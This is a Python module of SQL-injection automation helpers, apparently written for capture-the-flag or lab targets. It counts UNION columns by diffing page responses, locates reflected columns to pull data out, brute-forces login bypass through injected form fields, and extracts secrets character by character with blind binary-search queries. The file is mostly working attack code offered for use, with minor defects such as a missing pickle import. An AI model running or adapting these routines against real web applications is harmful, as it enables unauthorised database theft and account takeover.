from bs4 import BeautifulSoup
import re
import difflib
from itertools import compress
from connect import my_request as req


def find_error(url: str, param: str, cook: dict) -> str:
    html_responce = req.get_request(url, param, cook).replace(
        '<b>', '').replace('</b>', '').replace('\n', '')
    soup = BeautifulSoup(html_responce, 'html.parser')
    war = soup.find_all(string=re.compile("Warning"))
    return war


def none_func(s: str) -> str:
    return s


def count_columns(url: str, data: dict, cook={}, encode=none_func, method='get') -> int:
    '''
    Counting the number of columns that must be passed in the request 
    for a successful call.
    The request is transmitted via get (param), the response is the content of the web page.
    Тhe function compares responses from two consecutive requests 
    and checks the difference in them.

    max_columns: еstimated maximum number of columns
    html_responce_1, html_responce_2: response from the web page
    '''

    max_columns = 30
    html_responce_1 = ''
    payload = [(k, v) for k, v in data.items() if '%' in v]
    # ToDo for multiply %
    for i in range(1, max_columns):
        pl = payload[0][1] % str(i)
        if encode != none_func:
            print(pl)
            pl = encode(pl)
        data[payload[0][0]] = pl

        if method == 'get':
            html_responce_2 = req.get_request(url, data, cook)
        elif method == 'post':
            html_responce_2 = req.post_request(url, data, cook)
        else:
            print('request method is not understanding')
            return False

        for s in difflib.ndiff(html_responce_2, html_responce_1):
            if i > 1 and ('+' in s[0] or '-' in s[0]):
                print('num of columns: ', i - 1)
                return i - 1
            html_responce_1 = html_responce_2

    print('num of columns not find')
    return False


def find_visible_columns(url: str, columns: int, payload: str, p: str, finds: list,
                         cook={}, encode=none_func, method='get') -> list:
    '''
    The function finds the columns displayed on the web page after request.
    '''

    list_of_columns = [str(c + 1) * 3 for c in range(columns)]
    print('list of columns: ', list_of_columns)
    pl = payload % (','.join(list_of_columns))
    if encode != none_func:
        print(pl)
    param = {p: encode(pl)}

    if method == 'get':
        html_visible = req.get_request(url, param, cook)
    elif method == 'post':
        html_visible = req.post_request(url, param, cook)
    else:
        print('request method is not understanding')
        return False

    list_of_visible = [
        text for text in list_of_columns if text in html_visible]

    if not list_of_visible:
        print('not find visible column')
        exit(1)
    print('visible columns: ', list_of_visible)

    # find param
    keys = []
    for field in finds:
        list_of_columns[int(list_of_visible[0][0]) - 1] = field
        pl = payload % (','.join(list_of_columns))
        if encode != none_func:
            print(pl)
        param = {p: encode(pl)}

        if method == 'get':
            html_response = req.get_request(url, param, cook)
        elif method == 'post':
            html_response = req.post_request(url, param, cook)
        else:
            print('request method is not understanding')
            return False

        # Find differens
        index = 0
        key = []
        while html_response[index] == html_visible[index]:
            index += 1
        new_index = index
        # + 3 because 111,222 etc in request
        while html_response[new_index] != html_visible[index + 3]:
            key.append(html_response[new_index])
            new_index += 1
        print('key: ', ''.join(key))
        keys.append(''.join(key))

    return keys


def find_param(url: str, columns: int, field: str, list_of_visible: list, html_visible: str,
               payload: str, p: str, cook={}, encode=none_func) -> list:
    '''
    The function finds desired data in visible columns in the response.
    '''

    list_of_columns = [str(c + 1) * 3 for c in range(columns)]
    list_of_columns[int(list_of_visible[0][0]) - 1] = field
    pl = payload % (','.join(list_of_columns))
    if encode != none_func:
        print(pl)
    param = {p: encode(pl)}

    html_response = req.get_request(url, param, cook)

    # Find differens
    index = 0
    key = []
    while html_response[index] == html_visible[index]:
        index += 1
    new_index = index
    # because 111,222 etc in request
    while html_response[new_index] != html_visible[index + 3]:
        key.append(html_response[new_index])
        new_index += 1
    print('key: ', ''.join(key))

    return ''.join(key)


def find_column_position(url: str, list_of_columns: list, payload: str,
                         p: str, finds: str, cook={}) -> list:
    '''
    tmp for blind sql
    '''
    max_rows = 10
    m_row = 0
    index_m_row = 0
    for i in range(len(list_of_columns)):
        tmp = list_of_columns[i]
        list_of_columns[i] = finds
        param = {p: payload % (','.join(list_of_columns))}
        response = req.get_request(url, param, cook)
        soup = BeautifulSoup(response, 'html.parser')
        ret = soup.find(string=re.compile('rows'))
        # Find max of visible rows
        for j in range(max_rows):
            if str(j) in ret:
                if j > m_row:
                    m_row = j
                    index_m_row = i
        list_of_columns[i] = tmp
    if m_row:
        list_of_columns[index_m_row] = finds
        return [m_row, list_of_columns]
    print('column position not found')
    exit(1)


def try_auth(url: str, columns: int, data: str,
             finds: str, cook={}) -> str:
    '''
    Тry to log in if we know the number of columns and what we write in them.
    '''
    list_of_columns = [str(c + 1) * 3 for c in range(columns)]
    payload = [(k, v) for k, v in data.items() if '%' in v]
    for i in range(columns):
        data_dict = data.copy()
        tmp = list_of_columns[i]
        list_of_columns[i] = finds
        pl = payload[0][1] % (','.join(list_of_columns))
        data_dict[payload[0][0]] = pl

        response = req.post_request(url, data_dict, cook)
        if 'Login successful' in response:
            return response
        list_of_columns[i] = tmp
    print('auth not success')
    return False


def find_key_len(url: str, payload: str,
                 p: str, m_row: str, cook={}) -> int:
    left = -1
    right = 30
    while right > left + 1:
        middle = (left + right) // 2
        param = {p: payload % f'>{middle},1,0)'}
        response = req.get_request(url, param, cook)
        if m_row in response:
            left = middle
        else:
            right = middle
    return right


def find_binary(url: str, payload: str,
                p: str, m_row: str, left: int, right: int, len_of_key: int, cook={}) -> int:
    result = ''
    for i in range(1, len_of_key + 1):
        a = left
        b = right
        while b - a != 0:
            middle = a + (b - a) // 2 + 1
            param = {p: payload % (i, f'<{middle},1,0)')}
            response = req.get_request(url, param, cook)
            if m_row in response:
                b = middle - 1
            else:
                a = middle
        print(chr(a))
        result += chr(a)
    return result


def extract_pass(response: str, pass_r: str) -> str:
    soup = BeautifulSoup(response.replace('<b>', ''), 'html.parser')
    print(soup.find_all(string=re.compile("flag")))
    passw = soup.find(string=re.compile(pass_r))
    return passw


def save_cookies(cooks: dict):
    try:
        with open('cooks.pickle', 'wb') as f:
            pickle.dump(cooks, f)
    except:
        print('can not write cookies')
        exit(1)


def find_visible_columns_old(url: str, list_columns: list,
                             payload: dict, cook={}, method='get') -> list:
    '''
    The function finds the columns displayed on the web page after request.
    '''

    html_visible = req.my_request(url, payload, cook, method, 0, 1)
    list_of_visible = [text for text in list_columns if text in html_visible]

    if not list_of_visible:
        print('not find visible column')
        exit(1)
    print('visible columns: ', list_of_visible)
    return [list_of_visible, html_visible]


def find_param_old(url: str, html_visible: str,
                   payload: dict, cook={}, method='get') -> list:
    '''
    The function finds desired data in visible columns in the response.
    '''

    html_response = req.my_request(url, payload, cook, method, 0, 1)

    # Find differens
    index = 0
    key = []
    while html_response[index] == html_visible[index]:
        index += 1
    new_index = index
    # because 111,222 etc in request
    while html_response[new_index] != html_visible[index + 3]:
        key.append(html_response[new_index])
        new_index += 1
    print('key: ', ''.join(key))

    return ''.join(key)


def count_columns_old(url: str, payload: str, p: str, cook={}, encode=none_func, method='get') -> int:
    '''
    Counting the number of columns that must be passed in the request 
    for a successful call.
    The request is transmitted via get (param), the response is the content of the web page.
    Тhe function compares responses from two consecutive requests 
    and checks the difference in them.

    max_columns: еstimated maximum number of columns
    html_responce_1, html_responce_2: response from the web page
    '''

    max_columns = 30
    html_responce_1 = ''
    for i in range(1, max_columns):
        pl = payload % str(i)
        if encode != none_func:
            print(pl)
        param = {p: encode(pl)}

        if method == 'get':
            html_responce_2 = req.get_request(url, param, cook)
        elif method == 'post':
            html_responce_2 = req.post_request(url, param, cook)
        else:
            print('request method is not understanding')
            return False

        for s in difflib.ndiff(html_responce_2, html_responce_1):
            if i > 1 and ('+' in s[0] or '-' in s[0]):
                return i - 1
            html_responce_1 = html_responce_2

    print('num of columns not find')
    return False
